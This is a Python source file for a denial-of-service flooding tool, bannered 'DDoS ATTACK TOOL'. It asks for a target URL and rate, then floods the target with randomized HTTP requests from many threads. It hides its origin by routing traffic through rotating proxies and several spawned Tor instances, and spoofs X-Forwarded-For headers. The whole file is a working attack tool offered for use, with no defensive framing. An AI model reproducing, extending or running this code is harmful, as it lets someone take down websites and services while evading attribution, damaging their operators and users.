import threading
import requests
import os
import time
import random
import subprocess
import random
import string
import signal
import sys
from referer import referers
import threading
from concurrent.futures import ThreadPoolExecutor
from user_agents_list import user_agents

# Global variables for tracking request stats
request_count = 0
successful_requests = 0
failed_requests = 0

# List of user-agents for rotation
USER_AGENTS = user_agents

class ProxyChecker:
    @staticmethod
    def checkAll(proxies: list, url: str = "https://httpbin.org/get", timeout: int = 5, threads: int = 1000):
        with ThreadPoolExecutor(max_workers=min(len(proxies), threads)) as executor:
            future_to_proxy = {
                executor.submit(ProxyChecker._check_single, proxy, url, timeout): proxy
                for proxy in proxies
            }
            return [proxy for future, proxy in future_to_proxy.items() if future.result()]

    @staticmethod
    def _check_single(proxy: str, url: str, timeout: int):
        try:
            response = requests.get(url, proxies={"http": proxy, "https": proxy}, timeout=timeout)
            return response.status_code == 200
        except requests.RequestException:
            return False

# Function to validate proxies using ProxyChecker
def filter_working_proxies(proxies):
    print(f"proxy count: {len(proxies)}")
    print("[INFO] Validating proxies...")
    valid_proxies = ProxyChecker.checkAll(proxies)
    print(f"[INFO] {len(valid_proxies)} proxies are valid.")
    return valid_proxies



# Function to generate dynamic payloads
def generate_dynamic_payload():
    # Randomly choose the HTTP method
    methods = ['GET', 'POST', 'HEAD', 'PUT']
    method = random.choice(methods)

    # Create a random payload (simulated data for POST requests)
    if method == 'POST':
        payload = ''.join(random.choices(string.ascii_letters + string.digits, k=50))
        return {'method': method, 'payload': payload}
    
    # For GET/HEAD/PUT, use the method only (no payload)
    return {'method': method, 'payload': None}

def generate_headers():
    return {
        "User-Agent": random.choice(USER_AGENTS),
        "Referer": random.choice(referers),
        "X-Forwarded-For": f"{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}",
        "Connection": "keep-alive",
    }

# Function to send HTTPS requests with dynamic payloads
def ddos_attack_https(target_url, requests_per_second, proxies):
    global request_count, successful_requests, failed_requests
    proxy_index = 0  # Start with the first proxy in the list
    while True:
        try:
            for _ in range(requests_per_second):
                # Select a random user-agent
                headers = generate_headers()

                # Rotate to the next proxy in the list
                proxy = proxies[proxy_index] if proxies else None
                proxy_config = {"http": proxy, "https": proxy} if proxy else None

                # Generate a dynamic payload
                payload_data = generate_dynamic_payload()
                method = payload_data['method']
                payload = payload_data['payload']

                if method == 'GET':
                    response = requests.get(target_url, headers=headers, proxies=proxy_config, timeout=5)
                elif method == 'POST':
                    response = requests.post(target_url, headers=headers, data={'data': payload}, proxies=proxy_config, timeout=5)
                elif method == 'PUT':
                    response = requests.put(target_url, headers=headers, data={'data': payload}, proxies=proxy_config, timeout=5)
                else:
                    response = requests.head(target_url, headers=headers, proxies=proxy_config, timeout=5)

                request_count += 1
                if response.status_code == 200:
                    successful_requests += 1
                else:
                    failed_requests += 1

                # Move to the next proxy (rotate)
                proxy_index = (proxy_index + 1) % len(proxies)  # Loop back to 0 if we reach the end of the list
                
        except requests.exceptions.RequestException:
            failed_requests += 1


# Function to display real-time request statistics
def display_statistics():
    global request_count, successful_requests, failed_requests
    previous_count = 0
    while True:
        current_count = request_count
        requests_last_second = current_count - previous_count
        previous_count = current_count
        color = "\033[1;31m"

        print(f"""{color}RPS:{requests_last_second} Total Requests Sent: {request_count} Successful Requests: {successful_requests} Failed Requests: {failed_requests}""" )
        time.sleep(1)

# Function to set up multiple Tor instances
def multitor(num_ports=5):
    # Generate unique random ports
    tor_ports = random.sample(range(1024, 65535), num_ports)
    tor_processes = []
    proxies = []

    for port in tor_ports:
        # Create a unique data directory for each instance
        data_dir = f"tor_data_{port}"
        os.makedirs(data_dir, exist_ok=True)

        # Generate Tor configuration for the instance
        tor_config = f"""
        SOCKSPort {port}
        DataDirectory {data_dir}
        """
        config_path = f"tor_config_{port}.conf"
        with open(config_path, 'w') as config_file:
            config_file.write(tor_config.strip())

        # Start the Tor instance
        try:
            print(f"Starting Tor on port {port}...")
            process = subprocess.Popen(['tor', '-f', config_path], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            tor_processes.append(process)
            proxies.append(f"socks5h://127.0.0.1:{port}")
            time.sleep(6)  # Wait for Tor to initialize
        except FileNotFoundError:
            print(f"[ERROR] Tor binary not found. Ensure Tor is installed and in PATH.")
            cleanup_tor_processes(tor_processes)
            sys.exit(1)

    print(f"{len(tor_ports)} Tor instances started on ports: {tor_ports}")
    return proxies, tor_processes

# Function to load proxies from a file
def load_proxies_from_file(file_path):
    proxies = []
    if os.path.exists(file_path):
        with open(file_path, 'r') as file:
            proxies = [line.strip() for line in file if line.strip()]
    return proxies

# Function to gracefully terminate Tor processes
def cleanup_tor_processes(tor_processes):
    for process in tor_processes:
        process.terminate()
    print("\n[INFO] All Tor processes terminated.")

# Signal handler for graceful shutdown
def signal_handler(sig, frame):
    print("\n[INFO] Shutting down...")
    cleanup_tor_processes(tor_processes)
    sys.exit(0)

signal.signal(signal.SIGINT, signal_handler)

# Main function
# Main function
def main2():
    os.system('cls' if os.name == 'nt' else 'clear')
    color = "\033[1;31m"  # Corrected escape sequence for red color
    reset_color = "\033[0m"
    banner = r"""
╗██████╗ ██████╗  ██████╗ ███████╗
║██╔══██╗██╔══██╗██╔═══██╗██╔════╝
║██║  ██║██║  ██║██║   ██║███████╗
║██║  ██║██║  ██║██║   ██║╚════██║
║██████╔╝██████╔╝╚██████╔╝███████║
╚═════╝ ╚═════╝  ╚═════╝ ╚══════╝
    DDoS ATTACK TOOL
       -v 2.5
    """
    print(f"{color}{banner}{reset_color}") 
    # Input target details
    target_url = input("Enter Target URL (with https://): ")
    thread_count = int(input("Enter Number of Threads: "))
    requests_per_second = int(input("Enter Requests per Second per Thread: "))
    tor_instances = int(input("Enter Number of Tor Instances (0 for none): "))
    proxy_file = input("Enter Proxy File Path (leave blank to skip): ").strip()
    # Ask if the user wants to check proxies
    check_proxies = input("Do you want to check proxies? (y/n): ").strip().lower()
    
    #proxy_file = input("Enter Proxy File Path (leave blank to skip): ").strip()

    # Load proxies from file if specified
    proxies = []
    if proxy_file:
        proxies = load_proxies_from_file(proxy_file)

    # Initialize Tor proxies if Tor is enabled
    global tor_processes
    tor_processes = []
    if tor_instances > 0:
        tor_proxies, tor_processes = multitor(tor_instances)
        proxies.extend(tor_proxies)

    # Only validate proxies if the user wants to check them
    if check_proxies == 'y':
        proxies = filter_working_proxies(proxies)

        if not proxies:
            print("[ERROR] No working proxies available. Exiting.")
            cleanup_tor_processes(tor_processes)
            sys.exit(1)

    print(f"\n[INFO] Target: {target_url}")
    print("[INFO] Starting attack...\n")

    # Start statistics thread
    stats_thread = threading.Thread(target=display_statistics, daemon=True)
    stats_thread.start()

    # Start attack threads
    for _ in range(thread_count):
        thread = threading.Thread(target=ddos_attack_https, args=(target_url, requests_per_second, proxies))
        thread.start()

    for _ in range(thread_count):
        thread = threading.Thread(target=ddos_attack_https, args=(target_url, requests_per_second, proxies))
        thread.start()

if __name__ == "__main__":
    main2()

